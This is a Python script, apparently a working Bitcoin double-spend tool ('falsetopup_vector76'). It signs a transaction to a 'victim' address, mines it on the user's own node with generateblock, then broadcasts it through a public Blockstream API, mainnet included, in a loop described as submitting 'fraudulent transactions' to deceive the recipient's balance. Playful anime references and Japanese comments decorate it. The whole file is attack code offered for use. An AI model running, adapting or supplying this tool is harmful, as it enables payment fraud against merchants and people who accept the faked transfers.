import argparse
import time
import requests
import subprocess
import cryptos
import hashlib
import uuid

import bitcoin.rpc

parser = argparse.ArgumentParser(description="How To Use falsetopup_vector76")
parser.add_argument("node_host",
                    help="Blockchain Node Host",
                    type=str)
parser.add_argument("node_port",
                    help="Blockchain Node Port",
                    type=int)
parser.add_argument("username",
                    help="Public node username",
                    type=str)
parser.add_argument("password",
                    help="Public node password",
                    type=str)
parser.add_argument("send_from_wifkey",
                    help="Fake send btc from wif key.",
                    type=str)
parser.add_argument("fake_send_to",
                    help="Fake send btc to address.",
                    type=str)
parser.add_argument("amount_of_coins",
                    help="Amount of coins sent. (Enter in BTC units) The maximum amount delayed will vary depending on send_from.",
                    type=float)
parser.add_argument("--is_testnet",
                    "-test",
                    help="Testnet flag (Default=True)",
                    default=True,
                    type=bool)
parser.add_argument("--loop_count",
                    "-count",
                    help="How many fraudulent transactions to submit? If the balance is low, it may be possible to deceive the balance by sending it multiple times. (Default is 1.)",
                    default=1,
                    type=int)
def to_satoshi(btc_amount):
    satoshi = 0.00000001
    return round(btc_amount / satoshi)

def broadcast_transaction(raw_tx, testnet):

    if not testnet:
        url = "https://blockstream.info/api/tx"
        headers = {'Content-Type': 'text/plain'}
        payload = raw_tx
        response = requests.post(url, data=payload, headers=headers)
        print(response.text)
        if response.status_code == 200:
            print("Transaction successfully broadcasted!")
        else:
            print(f"Failed to broadcast transaction. Status code: {response.status_code}")
    if testnet:
        url = "https://blockstream.info/testnet/api/tx"
        headers = {'Content-Type': 'text/plain'}
        payload = raw_tx

        response = requests.post(url, data=payload, headers=headers)
        print(response.text)
        if response.status_code == 200:
            print("Transaction successfully broadcasted!")
        else:
            print(f"Failed to broadcast transaction. Status code: {response.status_code}")

    #if testnet:
    #    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    #    payload = raw_tx
    #    payload = {"tx_hex": raw_tx,
    #           "coin_symbol": "btc-testnet",
    #           "csrfmiddlewaretoken": csrf_token}

    #    response = requests.post(url, data=payload, headers=headers)
    #    if response.status_code == 200:
    #        print("Transaction successfully broadcasted!")
    #    else:
    #        print(f"Failed to broadcast transaction. Status code: {response.status_code}")



args = parser.parse_args()
rpc_host = args.node_host
rpc_port = args.node_port
username = args.username
password = args.password

fake_send_from   = args.send_from_wifkey
victim_address   = args.fake_send_to
amount_btc = args.amount_of_coins
testnet    = args.is_testnet
loop_count = args.loop_count

if loop_count <= 0:
    loop_count = 1

transaction_util = cryptos.Bitcoin(testnet=testnet)
print("Connecting Public Node...")
rpc_node = bitcoin.rpc.Proxy(service_url=f"http://{username}:{password}@{rpc_host}:{rpc_port}",
                 service_port=rpc_port)
print("OK")
balance = transaction_util.get_balance(transaction_util.wiftoaddr(fake_send_from))
inputs  = transaction_util.unspent(transaction_util.wiftoaddr(fake_send_from))
    #balance = transaction_util.get_balance(send_from)
if balance["confirmed"] <= 0:
    balance = balance["unconfirmed"]
else:
    balance = balance["confirmed"]

fake_hash = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()

send_amount = to_satoshi(amount_btc)

if balance < send_amount:
    print(f"[!] insufficient funds. ")
    exit()

fee = 0
change_btc_amt = (balance - send_amount)#おつり

input(" --- If you really want to continue, press enter. --- ")

for i  in range(loop_count):

    print(f"Fake Transaction {i}...")
    if testnet:
        tx_victim = [{"address": victim_address, "value": send_amount}, {"address": transaction_util.wiftoaddr(fake_send_from), "value": change_btc_amt}]
    else:
        tx_victim = [{"address": victim_address, "value": send_amount}, {"address": transaction_util.wiftoaddr(fake_send_from), "value": change_btc_amt}]

    tx_victim = transaction_util.mktx(inputs, tx_victim)
    if testnet:
        tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
    else:
        tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
    
    if i == 0:
        print()
        print("--------------------")
        print(f"Fake Send to                       : {victim_address}")
        print(f"Fake Send Amount (Satoshi unit)    : {send_amount} Satoshi")
        print(f"Signed  RawTx             : {tx_victim}")
        print(f"Testnet Mode              : {testnet}")
        print(f"Loop                      : {loop_count}")
        print("--------------------")
        print()
        print()

    print()
    print("Sending rawtx      Your node...")
    result = rpc_node.sendrawtransaction(tx=tx_victim)
    print("Mining rawtx block Your node...")
    rpc_node.call("generateblock", transaction_util.wiftoaddr(fake_send_from), [tx_victim])
    print()
    input(" --- If you really want to continue, press enter. --- ") #テスト
    print("Index > 強固なブロックチェーンに対して強制干渉を開始...")
    print()
    broadcast_transaction(tx_victim, testnet)
    print("SND ITX TOBC  (ブロックチェーンに不正なトランザクションを送信!)")
    print()
    #ゴリ押し
    print()
    #おまけ
    print("Kamijou Touma >> Kill that blockchain transaction!! 👊 💥 ")
    print()

    sound_name = "ImagineBreaker.mp3"
    try:
        import soundplay
        soundplay.playsound(sound_name)
    except:
        try:
            # Termux Only
            imagine_breaker_cmd = ["cvlc", "--play-and-exit", sound_name]
            subprocess.run(imagine_breaker_cmd)
        except:
            pass
    time.sleep(1) #休ませる

print("----------------")
balance = transaction_util.get_balance(victim_address)
print(f"fake send to address Balance (satoshi unit) :{balance}")
print("Done.")